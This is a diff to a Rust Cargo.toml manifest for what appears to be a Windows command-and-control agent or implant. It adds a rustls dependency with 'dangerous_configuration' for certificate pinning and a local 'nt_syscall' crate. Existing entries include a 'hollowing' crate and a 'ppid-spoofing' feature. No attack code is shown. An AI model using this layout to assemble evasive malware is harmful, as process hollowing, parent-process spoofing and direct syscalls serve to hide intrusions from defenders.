@@ -33,7 +33,12 @@ module_loader = { path = "../module_loader" }
 optimizer = { path = "../optimizer" }
 toml = "1.1.2"
 directories = "6.0.0"
+# rustls 0.23 is used by the agent's direct TLS (outbound, SSH transport, etc.)
 rustls = { version = "0.23.38", default-features = false, features = ["ring", "std", "logging", "tls12"] }
+# rustls 0.21 is the version reqwest 0.11 depends on; needed to build a custom
+# ServerCertVerifier for certificate pinning that is compatible with reqwest's
+# use_preconfigured_tls() API.
+rustls_0_21 = { package = "rustls", version = "0.21", default-features = false, features = ["dangerous_configuration"] }
 tokio-rustls = { version = "0.26.4", default-features = false, features = ["ring", "logging", "tls12"] }
 rustls-pemfile = "2.2.0"
 rustls-native-certs = "0.8"
@@ -67,6 +72,7 @@ winreg = "0.52"
 image = { version = "0.25", optional = true }
 winapi = { version = "0.3", features = ["debugapi", "processthreadsapi", "memoryapi", "sysinfoapi", "winbase", "winnt", "libloaderapi", "winreg", "winnls", "wow64apiset", "handleapi", "iphlpapi", "iptypes", "fileapi", "synchapi", "minwinbase", "tlhelp32", "combaseapi", "objbase", "wingdi", "winuser", "oleauto", "oaidl", "objidl", "rpcdce", "rpcndr"] }
 hollowing = { path = "../hollowing" }
+nt_syscall = { path = "../nt_syscall" }
 
 [features]
 ppid-spoofing = []
